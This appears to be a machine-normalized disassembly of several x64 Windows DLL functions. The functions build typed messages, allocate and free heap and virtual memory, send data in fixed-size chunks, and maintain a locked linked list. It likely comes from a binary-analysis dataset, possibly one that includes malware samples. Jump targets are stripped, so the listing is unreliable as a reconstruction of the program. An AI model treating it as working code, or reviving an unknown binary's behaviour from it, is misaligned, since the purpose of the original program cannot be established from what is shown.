mov [ rdi + 0x22 ] 0x4
mov [ rdi + 0x1e ] 0x1
mov ecx [ rbx ]
mov [ rdi + 0x12 ] ecx
mov ecx [ rbx + 0x4 ]
mov [ rdi + 0x1a ] 0x13
mov [ rdi + 0x16 ] ecx
mov rcx rdi
call sub_180017950
mov ebx eax
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov rcx rax
mov edx 0x8
call [ HeapFree@IAT ]
mov rdi [ rsp + 0x30 ]
mov eax ebx
add rsp 0x20
pop rbx
retn
xor eax eax
add rsp 0x20
pop rbx
retn
sub_1800188f0
sub rsp 0x58
test rcx rcx
jne r-xdata
mov ecx [ rcx + 0x4 ]
xor eax eax
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
call sub_180019990
test eax eax
je r-xdata
xor eax eax
add rsp 0x58
retn
add rsp 0x58
retn
mov ecx [ rsp + 0x30 ]
call sub_180019a70
mov ecx [ rsp + 0x30 ]
call sub_18001cc60
mov ecx [ rsp + 0x30 ]
call sub_180019dd0
mov eax 0x1
sub_180018960
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x50
mov esi r8d
mov rbp rdx
mov rdi rcx
test rdx rdx
je r-xdata
mov rbp [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x50
pop rdi
cmp esi 0x1
jb r-xdata
mov edx esi
mov rcx rbp
call sub_180019f30
mov ecx [ rdi + 0x10 ]
xor eax eax
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
call sub_1800198b0
test eax eax
je r-xdata
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] r12
lea ebx [ rsi + 0x27 ]
call [ GetProcessHeap@IAT ]
mov r8d ebx
mov edx 0x8
mov rcx rax
call [ HeapAlloc@IAT ]
mov r12 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
lea ecx [ rsi + 0x13 ]
mov eax 0x602
mov r8d esi
mov [ r12 + 0xa ] ecx
mov [ r12 + 0x4 ] ax
mov ecx [ rsp + 0x20 ]
mov [ r12 + 0x12 ] ecx
mov ecx [ rsp + 0x24 ]
mov rdx rbp
mov [ r12 + 0x16 ] ecx
lea rcx [ r12 + 0x22 ]
mov [ r12 + 0x1a ] 0x12
mov [ r12 + 0x1e ] esi
call sub_18000c440
mov rcx r12
call sub_180017950
mov ebx eax
call [ GetProcessHeap@IAT ]
mov r8 r12
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
test ebx ebx
jne r-xdata
mov ecx [ rdi + 0x10 ]
call sub_180019a70
mov ecx [ rdi + 0x10 ]
call sub_18001cc60
mov ecx [ rdi + 0x10 ]
call sub_180019dd0
sub_180018aa0
test rcx rcx
je r-xdata
retn
push rdi
sub rsp 0x50
xor eax eax
mov rdi rcx
mov ecx [ rcx + 0x10 ]
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
call sub_1800198b0
test eax eax
je r-xdata
add rsp 0x50
pop rdi
mov [ rsp + 0x60 ] rbx
call [ GetProcessHeap@IAT ]
mov edx 0x8
lea r8d [ rdx + 0x1f ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov rbx rax
mov eax 0x602
mov [ rbx + 0x4 ] ax
mov [ rbx + 0xa ] 0x14
mov [ rbx + 0x22 ] 0x4
mov [ rbx + 0x1e ] 0x1
mov ecx [ rsp + 0x20 ]
mov [ rbx + 0x12 ] ecx
mov ecx [ rsp + 0x24 ]
mov [ rbx + 0x1a ] 0x13
mov [ rbx + 0x16 ] ecx
mov rcx rbx
call sub_180017950
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
mov edx 0x8
call [ HeapFree@IAT ]
mov ecx [ rdi + 0x10 ]
call sub_180019a70
mov ecx [ rdi + 0x10 ]
call sub_180019dd0
mov rbx [ rsp + 0x60 ]
sub_180018b70
sub rsp 0x58
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
call sub_180019b20
test eax eax
je r-xdata
mov eax 0x1
add rsp 0x58
retn
nop [ rax ] eax
mov ecx [ rsp + 0x30 ]
call sub_18001cc60
mov ecx [ rsp + 0x30 ]
call sub_180019dd0
lea rcx [ rsp + 0x20 ]
call sub_180019b20
test eax eax
jne r-xdata
sub_180018bd0
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rdi rcx
test rcx rcx
jne r-xdata
mov [ rsp + 0x90 ] rbx
lea rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
xor eax eax
mov rdi [ rsp + 0xa0 ]
add rsp 0x80
pop rbp
retn
xor eax eax
jmp r-xdata
cmp [ rcx + 0xc ] 0x8
jb r-xdata
mov rbx [ rsp + 0x90 ]
mov rdi [ rsp + 0xa0 ]
add rsp 0x80
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x50 ]
mov [ rsp + 0x98 ] rsi
mov [ rbp - 0x50 ] rax
mov [ rbp - 0x48 ] rax
mov [ rbp - 0x40 ] rax
mov [ rbp - 0x38 ] rax
call sub_180019d00
mov esi eax
test eax eax
je r-xdata
call [ GetProcessHeap@IAT ]
mov edx 0x8
lea r8d [ rdx + 0x1f ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx [ rbx ]
mov [ rbp - 0x4c ] ecx
movzx ecx [ rbx + 0x4 ]
call sub_180019e90
mov ecx [ rbp - 0x40 ]
mov edx 0x3
lea r8d [ rdx - 0x2 ]
mov [ rbp - 0x48 ] ax
call sub_18001cef0
mov ecx [ rbp - 0x40 ]
lea r11 [ sub_180018aa0 ]
lea r8 [ sub_180018960 ]
xor r9d r9d
xor edx edx
mov [ rsp + 0x20 ] r11
call sub_18001cc90
lea rcx [ rbp - 0x50 ]
call sub_18001c950
test eax eax
jne r-xdata
mov [ rax + 0xa ] 0x14
mov eax 0x602
mov [ rbx + 0x4 ] ax
mov [ rbx + 0x1e ] 0x1
mov eax [ rdi ]
mov [ rbx + 0x12 ] eax
mov eax [ rdi + 0x4 ]
mov [ rbx + 0x1a ] 0x10
mov [ rbx + 0x16 ] eax
test esi esi
je r-xdata
mov rsi [ rsp + 0x98 ]
xor eax eax
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x2c ] rax
mov [ rbp - 0x24 ] rax
mov [ rbp - 0x1c ] rax
mov [ rbp - 0x14 ] rax
mov [ rbp - 0xc ] eax
mov eax [ rbp - 0x40 ]
mov [ rbp - 0x20 ] eax
mov eax [ rdi ]
mov [ rbp - 0x30 ] eax
mov eax [ rdi + 0x4 ]
mov [ rbp - 0x2c ] eax
mov eax [ rbx ]
mov [ rbp - 0x28 ] eax
movzx eax [ rbx + 0x4 ]
mov [ rbp - 0x24 ] eax
call sub_1800197f0
mov esi 0x1
mov ecx [ rbp - 0x40 ]
call sub_180019dd0
mov [ rbx + 0x22 ] 0x3
mov [ rbx + 0x22 ] 0x0
jmp r-xdata
mov rcx rbx
call sub_180017950
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
sub_180018d80
push rbx
sub rsp 0x50
mov rbx rcx
test rcx rcx
jne r-xdata
mov edx [ rcx + 0xc ]
add rcx 0x10
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
call sub_180019ea0
mov ecx [ rbx + 0x4 ]
xor eax eax
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
call sub_180019990
mov ecx [ rsp + 0x30 ]
mov edi eax
test eax eax
je r-xdata
xor eax eax
add rsp 0x50
pop rbx
retn
call sub_180019a70
mov ecx [ rsp + 0x30 ]
call sub_18001cc60
mov ecx [ rsp + 0x30 ]
call sub_180019dd0
mov rcx rbx
call sub_180018850
mov r8d [ rbx + 0xc ]
lea rdx [ rbx + 0x10 ]
xor r9d r9d
call sub_18001ca70
test eax eax
jne r-xdata
mov rsi [ rsp + 0x60 ]
mov eax edi
mov rdi [ rsp + 0x68 ]
add rsp 0x50
pop rbx
retn
mov rsi [ rsp + 0x60 ]
mov edi 0x1
mov eax edi
mov rdi [ rsp + 0x68 ]
add rsp 0x50
pop rbx
retn
sub_180018e40
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax 0x602
cmp ax [ rcx + 0x4 ]
jne r-xdata
xor eax eax
add rsp 0x28
retn
lea r8 [ rcx + 0x12 ]
test r8 r8
je r-xdata
mov eax 0x1
add rsp 0x28
retn
mov eax [ r8 + 0xc ]
lea rdx [ rax + r8 + 0x10 ]
mov eax [ rcx + 0xa ]
lea rcx [ rax + rcx + 0x12 ]
cmp rdx rcx
ja r-xdata
mov edx [ r8 + 0x8 ]
sub edx 0x10
je r-xdata
mov rcx r8
call sub_180018bd0
dec edx
je r-xdata
mov rcx r8
call sub_1800188f0
mov eax 0x1
add rsp 0x28
retn
dec edx
je r-xdata
mov rcx r8
call sub_180018d80
mov eax 0x1
add rsp 0x28
retn
dec edx
jne r-xdata
mov rcx r8
call sub_1800188f0
mov eax 0x1
add rsp 0x28
retn
sub_180018ee0
mov [ rsp + 0x20 ] rbx
push rbp
push rdi
push r14
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
call sub_18001af90
xor ecx ecx
mov r8d 0x1000
lea edi [ rax + rax * 2 ]
lea r9d [ rcx + 0x40 ]
mov ebp eax
shl edi 0x4
lea edx [ rdi + 0x5b ]
call [ VirtualAlloc@IAT ]
mov r14 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop rdi
pop rbp
retn
movzx r8d [ rbx + 0x4 ]
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] r12
lea edx [ rdi + 0x48 ]
mov rcx rax
mov [ rsp + 0x50 ] r13
lea r12 [ rbx + 0x12 ]
call sub_180016f70
mov r11d [ rbx + 0xe ]
lea rdx [ r14 + 0x12 ]
mov [ r14 + 0xe ] r11d
mov rcx r12
mov [ r14 + 0x12 ] ebp
sub rdx r12
nop
movzx eax [ rcx ]
inc rcx
mov [ rdx + rcx + 0x3 ] al
test al al
jne r-xdata
xor r13d r13d
mov ebx r13d
cmp [ r14 + 0x12 ] ebx
jbe r-xdata
lea eax [ r13 + r13 * 2 ]
mov [ r14 + 0x12 ] r13d
mov rcx r14
shl eax 0x4
add eax 0x48
mov [ r14 + 0xa ] eax
call sub_180017950
xor edx edx
mov r8d 0x8000
mov rcx r14
call [ VirtualFree@IAT ]
mov r13 [ rsp + 0x50 ]
mov r12 [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
lea rbp [ r14 + 0x2a ]
nop
mov rcx [ rdi ]
inc r13d
add rbp 0x30
mov [ rbp - 0x30 ] rcx
mov rax [ rdi + 0x8 ]
mov [ rbp - 0x28 ] rax
mov rax [ rdi + 0x10 ]
mov [ rbp - 0x20 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp - 0x18 ] rax
mov rax [ rdi + 0x20 ]
mov [ rbp - 0x10 ] rax
mov rax [ rdi + 0x28 ]
mov [ rbp - 0x8 ] rax
mov rdx rax
mov rcx r12
call sub_1800117c0
test eax eax
jne r-xdata
lea rcx [ rw-data ]
mov edx ebx
call sub_18001af70
cmp [ r12 ] 0x0
mov rdi rax
je r-xdata
inc ebx
cmp ebx [ r14 + 0x12 ]
jb r-xdata
sub_180019030
mov r11 rsp
mov [ r11 + 0x20 ] rbx
push rdi
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
xor eax eax
mov [ rsp + 0x20 ] 0x0
mov ebx edx
mov [ r11 - 0x47 ] rax
mov [ r11 - 0x3f ] rax
mov [ rsp + 0x31 ] ax
mov [ rsp + 0x33 ] al
mov rdi r8
mov rdx rcx
mov [ r11 - 0x34 ] rax
mov [ r11 - 0x2c ] rax
mov [ r11 - 0x24 ] rax
lea r8d [ rax + 0x13 ]
lea rcx [ r11 - 0x48 ]
mov [ rsp + 0x4c ] eax
call sub_18000be10
mov rcx rdi
mov [ rsp + 0x34 ] ebx
call sub_18001b580
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call sub_18001b3c0
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
xor eax eax
test rbx rbx
je r-xdata
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_18001adb0
mov eax 0x1
jmp r-xdata
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x88 ]
add rsp 0x60
pop rdi
retn
sub_1800190f0
mov r11 rsp
push rdi
push r12
sub rsp 0xb8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov eax [ rcx + 0x2a ]
mov r12 rcx
add eax 0x21
cmp [ rcx + 0xa ] eax
jne r-xdata
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_18000c060
add rsp 0xb8
pop r12
pop rdi
retn
mov [ r11 + 0x10 ] rbx
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] r13
lea rcx [ rw-data ]
mov [ r11 - 0x28 ] r14
xor r13d r13d
call sub_18001af90
mov ebx r13d
lea r14d [ r13 + 0x1 ]
mov esi eax
test eax eax
je r-xdata
mov rsi [ rsp + 0xb0 ]
mov rbx [ rsp + 0xd8 ]
test r13d r13d
mov r13 [ rsp + 0xa8 ]
jne r-xdata
mov [ rsp + 0xe0 ] rbp
nop [ rax + rax ] ax
xor edx edx
lea rcx [ rsp + 0x21 ]
mov [ rsp + 0x20 ] 0x0
lea r8d [ rdx + 0x63 ]
call sub_18000bd10
movzx r8d [ r12 + 0x4 ]
lea rcx [ rsp + 0x20 ]
mov edx 0x18
call sub_180016f70
mov r11d [ r12 + 0xe ]
lea rdx [ r12 + 0x12 ]
lea rcx [ rsp + 0x32 ]
mov r8d 0x13
mov [ rsp + 0x2e ] r11d
mov [ rsp + 0x46 ] r14d
call sub_18000be10
lea rcx [ rsp + 0x20 ]
call sub_180017950
mov r14 [ rsp + 0xa0 ]
mov r9d [ r12 + 0x2a ]
mov edx [ r12 + 0x26 ]
lea r8 [ r12 + 0x2e ]
lea rcx [ r12 + 0x12 ]
call sub_180019030
mov r14d eax
mov eax [ rbp + 0x14 ]
cmp [ r12 + 0x26 ] eax
jbe r-xdata
inc ebx
cmp ebx esi
jb r-xdata
mov r13d r14d
mov rcx [ rbp + 0x18 ]
call sub_18001b4c0
lea rcx [ rw-data ]
mov r8d r14d
mov edx ebx
call sub_18001ae90
jmp r-xdata
lea rcx [ rw-data ]
mov edx ebx
call sub_18001af70
lea rdx [ r12 + 0x12 ]
mov rcx rax
mov rbp rax
call sub_1800117c0
test eax eax
je r-xdata
jmp r-xdata
mov rbp [ rsp + 0xe0 ]
sub_180019270
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r15
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbp rcx
lea rcx [ rw-data ]
call sub_18001af90
xor r15d r15d
mov esi eax
mov ebx r15d
test eax eax
je r-xdata
movzx ebx [ rbp + 0x4 ]
mov edi 0x10a
cmp bx di
je r-xdata
lea r12 [ sub_180017950 ]
nop [ rax + rax ] ax
xor edx edx
lea rcx [ rsp + 0x31 ]
lea r8d [ rdx + 0x63 ]
call sub_18000bd10
mov eax 0x111
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x34 ] ax
cmp bx di
jne r-xdata
mov eax 0x10e
cmp bx ax
jne r-xdata
inc ebx
cmp ebx esi
jb r-xdata
lea rdx [ rsp + 0x28 ]
mov rcx rbp
mov [ rsp + 0x28 ] r12
call r8
mov rdi rax
test rax rax
jne r-xdata
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x36 ] 0xffffffff
mov [ rsp + 0x3a ] r15d
call sub_180017950
mov eax 0x10d
mov [ rsp + 0x34 ] ax
xor eax eax
lea rcx [ rw-data ]
mov edx ebx
call sub_18001af70
mov r8 [ rax + 0x28 ]
test r8 r8
je r-xdata
mov eax [ rax + 0xe ]
lea rbx [ rdi + 0x12 ]
mov [ rsp + 0xf0 ] r14
mov r14d [ rdi + 0xa ]
mov [ rsp + 0x24 ] eax
movzx eax [ rdi + 0x4 ]
mov [ rsp + 0x20 ] ax
test rbx rbx
je r-xdata
xor edx edx
mov r8d 0x8000
mov rcx rdi
call [ VirtualFree@IAT ]
mov r14 [ rsp + 0xf0 ]
mov eax 0x1
jmp r-xdata
cmp r14d 0x1
jb r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0xf8 ]
add rsp 0xb0
pop r15
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0xe8 ] r13
mov eax 0x40416289
mov esi r15d
mul r14d
mov r13d edx
shr r13d 0x10
test r13d r13d
je r-xdata
mov ebp esi
mov ebx r14d
imul ebp ebp 0x3fbee
sub ebx ebp
cmp ebx 0x1
jb r-xdata
mov ebp r15d
nop [ rax + rax ] eax
mov r13 [ rsp + 0xe8 ]
xor ecx ecx
lea rdx [ rbx + 0x13 ]
mov r8d 0x1000
lea r9d [ rcx + 0x4 ]
mov r13d ebx
call [ VirtualAlloc@IAT ]
mov r12 rax
test rax rax
je r-xdata
movzx eax [ rsp + 0x20 ]
mov edx ebp
lea rcx [ r12 + 0x12 ]
mov [ r12 + 0x4 ] ax
mov eax [ rsp + 0x24 ]
add rdx rbx
mov r8d 0x3fbee
mov [ r12 + 0xa ] 0x3fbee
mov [ r12 + 0x6 ] r14d
mov [ r12 + 0xe ] eax
call sub_18000c440
mov rcx r12
call sub_180017950
xor edx edx
mov r8d 0x8000
mov rcx r12
mov ebx eax
call [ VirtualFree@IAT ]
test ebx ebx
je r-xdata
mov [ rax ] r15d
movzx eax [ rsp + 0x20 ]
test esi esi
mov [ r12 + 0x4 ] ax
mov eax [ rsp + 0x24 ]
cmovne r15d r14d
mov [ r12 + 0xe ] eax
lea rax [ rdi + 0x12 ]
mov edx ebp
lea rcx [ r12 + 0x12 ]
mov r8d r13d
add rdx rax
mov [ r12 + 0xa ] ebx
mov [ r12 + 0x6 ] r15d
call sub_18000c440
mov rcx r12
call sub_180017950
xor edx edx
mov r8d 0x8000
mov rcx r12
call [ VirtualFree@IAT ]
inc esi
add ebp 0x3fbee
lea rbx [ rdi + 0x12 ]
cmp esi r13d
jb r-xdata
xor ecx ecx
mov edx 0x3fc00
mov r8d 0x1000
lea r9d [ rcx + 0x4 ]
call [ VirtualAlloc@IAT ]
mov r12 rax
test rax rax
je r-xdata
sub_180019530
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
movzx edx [ rcx + 0x4 ]
sub edx 0x500
je r-xdata
call sub_180018ee0
mov eax 0x1
jmp r-xdata
dec edx
je r-xdata
add rsp 0x38
retn
call sub_1800190f0
mov eax 0x1
jmp r-xdata
call sub_180019270
mov [ rsp + 0x20 ] eax
jmp r-xdata
sub_1800195a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor edi edi
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] rdi
lea r9d [ rdi + 0x4 ]
xor ecx ecx
mov edx 0x700000
mov r8d 0x2000
call [ VirtualAlloc@IAT ]
mov [ rbx + 0x10 ] rdi
mov [ rbx + 0x18 ] edi
mov [ rbx + 0x8 ] rax
mov rax rbx
mov [ rbx + 0x20 ] rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180019630
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx [ rdx + 0x6 ]
mov eax [ rdx + 0xa ]
cmp ecx eax
jb r-xdata
mov edx r8d
sub rdx 0x12
cmp rax rdx
ja r-xdata
cmp ecx 0x700000
ja r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
mov rdx rcx
mov rcx [ rbx + 0x8 ]
mov r9d 0x4
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov [ rbx + 0x20 ] rax
test rax rax
je r-xdata
cmp [ rbx + 0x14 ] ecx
je r-xdata
mov [ rbx + 0x10 ] 0x0
mov [ rbx + 0x18 ] 0x0
mov eax [ rdi + 0x6 ]
mov [ rbx + 0x14 ] eax
mov ecx [ rbx + 0x18 ]
mov r8d [ rdi + 0xa ]
lea rdx [ rdi + 0x12 ]
add rcx [ rbx + 0x20 ]
call sub_18000c440
mov r11d [ rdi + 0xa ]
add [ rbx + 0x18 ] r11d
mov ecx [ rbx + 0x18 ]
cmp ecx [ rbx + 0x14 ]
jne r-xdata
mov eax 0x1
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx + 0x10 ] 0x1
sub_180019720
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov edi edx
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
test dil 0x1
je r-xdata
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18000ec1c
sub_1800197f0
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rdi rcx
jne r-xdata
mov [ rsp + 0x30 ] rbx
call [ GetProcessHeap@IAT ]
mov edx 0x8
lea r8d [ rdx + 0x20 ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov rbx rax
test rax rax
jne r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
mov eax [ rdi + 0x10 ]
lea rcx [ rw-data ]
mov [ rbx + 0x10 ] eax
mov eax [ rdi ]
mov [ rbx ] eax
mov eax [ rdi + 0x4 ]
mov [ rbx + 0x4 ] eax
mov eax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] eax
mov eax [ rdi + 0xc ]
mov [ rbx + 0xc ] eax
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
mov [ r11 + 0x20 ] rbx
mov [ rbx + 0x18 ] r11
lea rax [ rw-data ]
mov [ rbx + 0x20 ] rax
inc [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] rbx
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov eax 0x1
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800198b0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov ebx ecx
test rdx rdx
je r-xdata
xor eax eax
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rsi
mov [ rdx ] rax
mov [ rdx + 0x8 ] rax
mov [ rdx + 0x10 ] rax
mov [ rdx + 0x18 ] rax
xor esi esi
mov [ rdx + 0x20 ] rax
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
lea rax [ rw-data ]
cmp r11 rax
je r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp ebx [ r11 + 0x10 ]
je r-xdata
mov rax [ r11 ]
mov esi 0x1
mov [ rdi ] rax
mov rdx [ r11 + 0x8 ]
mov [ rdi + 0x8 ] rdx
mov rdx [ r11 + 0x10 ]
mov [ rdi + 0x10 ] rdx
mov rdx [ r11 + 0x18 ]
mov [ rdi + 0x18 ] rdx
mov [ rdi + 0x18 ] 0x0
mov [ rdi + 0x20 ] 0x0
mov r11 [ r11 + 0x20 ]
cmp r11 rax
jne r-xdata
jmp r-xdata
sub_180019990
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov ebx ecx
test rdx rdx
je r-xdata
xor eax eax
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rsi
mov [ rdx ] rax
mov [ rdx + 0x8 ] rax
mov [ rdx + 0x10 ] rax
mov [ rdx + 0x18 ] rax
xor esi esi
mov [ rdx + 0x20 ] rax
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
lea rax [ rw-data ]
cmp r11 rax
je r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp ebx [ r11 + 0x4 ]
je r-xdata
mov rax [ r11 ]
mov esi 0x1
mov [ rdi ] rax
mov rdx [ r11 + 0x8 ]
mov [ rdi + 0x8 ] rdx
mov rdx [ r11 + 0x10 ]
mov [ rdi + 0x10 ] rdx
mov rdx [ r11 + 0x18 ]
mov [ rdi + 0x18 ] rdx
mov [ rdi + 0x18 ] 0x0
mov [ rdi + 0x20 ] 0x0
mov r11 [ r11 + 0x20 ]
cmp r11 rax
jne r-xdata
jmp r-xdata
sub_180019a70
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov edi ecx
jne r-xdata
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
xor esi esi
call [ EnterCriticalSection@IAT ]
mov rbx [ rw-data ]
lea rax [ rw-data ]
cmp rbx rax
je r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov eax esi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp edi [ rbx + 0x10 ]
je r-xdata
mov rdx [ rbx + 0x18 ]
mov rax [ rbx + 0x20 ]
mov [ rdx + 0x20 ] rax
mov rdx [ rbx + 0x20 ]
mov rax [ rbx + 0x18 ]
mov [ rdx + 0x18 ] rax
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
dec [ rw-data ]
mov esi 0x1
mov rbx [ rbx + 0x20 ]
cmp rbx rax
jne r-xdata
jmp r-xdata
sub_180019b20
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx rcx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
xor eax eax
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] rdi
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] rax
lea rcx [ rw-data ]
xor esi esi
call [ EnterCriticalSection@IAT ]
mov rdi [ rw-data ]
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rdi [ rsp + 0x38 ]
mov eax esi
mov rsi [ rsp + 0x30 ]
add rsp 0x20
pop rbx
retn
mov rcx [ rdi + 0x18 ]
mov rax [ rdi + 0x20 ]
mov [ rcx + 0x20 ] rax
mov rax [ rdi + 0x18 ]
mov rcx [ rdi + 0x20 ]
mov [ rcx + 0x18 ] rax
mov rax [ rdi ]
mov [ rbx ] rax
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov rax [ rdi + 0x20 ]
mov [ rbx + 0x20 ] rax
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
dec [ rw-data ]
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x20 ] rsi
mov esi 0x1
sub_180019c10
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0x1
add rsp 0x28
retn
lea rax [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] 0x0
mov [ rw-data ] rax
mov [ rw-data ] rax
call [ InitializeCriticalSection@IAT ]
mov [ rw-data ] 0x1
sub_180019c60
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x28
retn
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x20 ] rdi
mov rdi [ rw-data ]
lea rsi [ rw-data ]
cmp rdi rsi
je r-xdata
lea rcx [ rw-data ]
mov [ rw-data ] 0x0
mov [ rw-data ] rsi
mov [ rw-data ] rsi
call [ DeleteCriticalSection@IAT ]
mov rdi [ rsp + 0x20 ]
